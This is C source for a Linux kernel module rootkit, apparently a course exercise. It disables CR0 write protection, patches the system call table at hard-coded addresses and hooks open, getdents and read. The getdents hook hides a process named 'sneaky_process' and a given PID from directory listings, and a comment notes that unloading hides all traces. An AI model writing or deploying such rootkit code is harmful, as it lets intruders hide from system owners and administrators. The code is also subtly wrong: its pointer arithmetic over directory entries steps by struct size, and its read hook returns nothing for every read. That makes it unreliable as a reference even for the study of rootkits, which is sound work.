#include <linux/module.h>      // for all modules 
#include <linux/moduleparam.h>
#include <linux/init.h>        // for entry/exit macros 
#include <linux/kernel.h>      // for printk and other kernel bits
#include <linux/stat.h>
#include <asm/current.h>       // process information
#include <linux/sched.h>
#include <linux/highmem.h>     // for changing page permissions
#include <asm/unistd.h>        // for system call constants
#include <linux/kallsyms.h>
#include <asm/page.h>
#include <asm/cacheflush.h>
/* #include <string.h> */
/* #define _GNU_SOURCE */
/* #include <dirent.h>     /\* Defines DT_* constants *\/ */
/* #include <fcntl.h> */
/* #include <stdio.h> */
/* #include <unistd.h> */
/* #include <stdlib.h> */
/* #include <sys/stat.h> */
/* #include <sys/syscall.h> */
/* #include <string.h> */

//----------------------arguments from parent-----------------------
static char *sneaky_process_pid = "";
module_param(sneaky_process_pid, charp, 0);
MODULE_PARM_DESC(sneaky_process_pid, "sneaky process pid");

//Macros for kernel functions to alter Control Register 0 (CR0)
//This CPU has the 0-bit of CR0 set to 1: protected mode is enabled.
//Bit 0 is the WP-bit (write protection). We want to flip this to 0
//so that we can change the read/write permissions of kernel pages.
#define read_cr0() (native_read_cr0())
#define write_cr0(x) (native_write_cr0(x))

//These are function pointers to the system calls that change page
//permissions for the given address (page) to read-only or read-write.
//Grep for "set_pages_ro" and "set_pages_rw" in:
//      /boot/System.map-`$(uname -r)`
//      e.g. /boot/System.map-4.4.0-116-generic
void (*pages_rw)(struct page *page, int numpages) = (void *)0xffffffff81072040;
void (*pages_ro)(struct page *page, int numpages) = (void *)0xffffffff81071fc0;

//This is a pointer to the system call table in memory
//Defined in /usr/src/linux-source-3.13.0/arch/x86/include/asm/syscall.h
//We're getting its adddress from the System.map file (see above).
static unsigned long *sys_call_table = (unsigned long*)0xffffffff81a00200;



#define BUF_SIZE 1024
struct linux_dirent {
  unsigned long  d_ino;     /* Inode number */
  unsigned long  d_off;     /* Offset to next linux_dirent */
  unsigned short d_reclen;  /* Length of this linux_dirent */
  char           d_name[];  /* Filename (null-terminated) */
  /* length is actually (d_reclen - 2 -
     offsetof(struct linux_dirent, d_name)) */
  /*
               char           pad;       // Zero padding byte
               char           d_type;    // File type (only since Linux
                                         // 2.6.4); offset is (d_reclen - 1)
					 */
};
/*
e.g.
              inode#  file type  d_reclen  d_off d_name
                  2  directory    16         12  .
                  2  directory    16         24  ..
                 11  directory    24         44  lost+found
                 12  regular      16         56  a
             228929  directory    16         68  sub
              16353  directory    16         80  sub2
             130817  directory    16       4096  sub3

*/

  
//Function pointer will be used to save address of original 'open' syscall.
//The asmlinkage keyword is a GCC #define that indicates this function
//should expect ti find its arguments on the stack (not in registers).
//This is used for all system calls.
asmlinkage int (*original_call_open)(const char *pathname, int flags);
asmlinkage int (*original_call_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
asmlinkage int (*original_call_read)(int fd, void *buf, size_t count);


//Define our new sneaky version of the 'open' syscall
asmlinkage int sneaky_sys_open(const char *pathname, int flags)
{
  printk(KERN_INFO "Very, very Sneaky!\n");  
  return original_call_open(pathname, flags);
}

asmlinkage int sneaky_sys_getdents(unsigned int fd,
				   struct linux_dirent *dirp,
				   unsigned int count)
{
  printk(KERN_INFO "Very, very Sneaky!\n");

  struct linux_dirent * d = dirp;
  unsigned int bpos = 0;
  int nread = original_call_getdents(fd, dirp, count);
  if(nread == -1) {
    return -1;
  }

  
  for (; bpos < nread;) {
    d = dirp + bpos;


    if (strcmp(d->d_name, "sneaky_process") == 0 ||
	strcmp(d->d_name, sneaky_process_pid) == 0) {

      int dirent_len = d->d_reclen;
      char* src = (char *) d + d->d_reclen;
      char* end = (char *) dirp + nread;
      memmove(d,
	      src,
	      (int)(end - src));
      nread -=  dirent_len;

    } else {
      bpos += d->d_reclen;
    }

  }
  
  
  
  return nread;
}

asmlinkage int sneaky_sys_read(int fd, void *buf, size_t count)
{
  printk(KERN_INFO "Very, very Sneaky!\n");  
  return 0;
}


//------------------------------------------------------------------------------------


//The code that gets executed when the module is loaded
static int initialize_sneaky_module(void)
{
  struct page *page_ptr;

  //See /var/log/syslog for kernel print output
  printk(KERN_INFO "Sneaky module being loaded.\n");

  //Turn off write protection mode
  write_cr0(read_cr0() & (~0x10000));
  //Get a pointer to the virtual page containing the address
  //of the system call table in the kernel.
  page_ptr = virt_to_page(&sys_call_table);
  //Make this page read-write accessible
  pages_rw(page_ptr, 1);

  //This is the magic! Save away the original 'open' system call
  //function address. Then overwrite its address in the system call
  //table with the function address of our new code.
  original_call_open = (void*)*(sys_call_table + __NR_open);
  *(sys_call_table + __NR_open) = (unsigned long)sneaky_sys_open;

  original_call_getdents = (void*)*(sys_call_table + __NR_getdents);
  *(sys_call_table + __NR_getdents) = (unsigned long)sneaky_sys_getdents;

  original_call_read = (void*)*(sys_call_table + __NR_read);
  *(sys_call_table + __NR_read) = (unsigned long)sneaky_sys_read;

  
  //Revert page to read-only
  pages_ro(page_ptr, 1);
  //Turn write protection mode back on
  write_cr0(read_cr0() | 0x10000);

  return 0;       // to show a successful load 
}  


static void exit_sneaky_module(void) 
{
  struct page *page_ptr;

  printk(KERN_INFO "Sneaky module being unloaded.\n"); 

  //Turn off write protection mode
  write_cr0(read_cr0() & (~0x10000));

  //Get a pointer to the virtual page containing the address
  //of the system call table in the kernel.
  page_ptr = virt_to_page(&sys_call_table);
  //Make this page read-write accessible
  pages_rw(page_ptr, 1);

  //This is more magic! Restore the original 'open' system call
  //function address. Will look like malicious code was never there!
  *(sys_call_table + __NR_open) = (unsigned long)original_call_open;

  *(sys_call_table + __NR_getdents) = (unsigned long)original_call_getdents;

  *(sys_call_table + __NR_read) = (unsigned long)original_call_read;
  //Revert page to read-only
  pages_ro(page_ptr, 1);
  //Turn write protection mode back on
  write_cr0(read_cr0() | 0x10000);
}  


module_init(initialize_sneaky_module);  // what's called upon loading 
module_exit(exit_sneaky_module);        // what's called upon unloading  

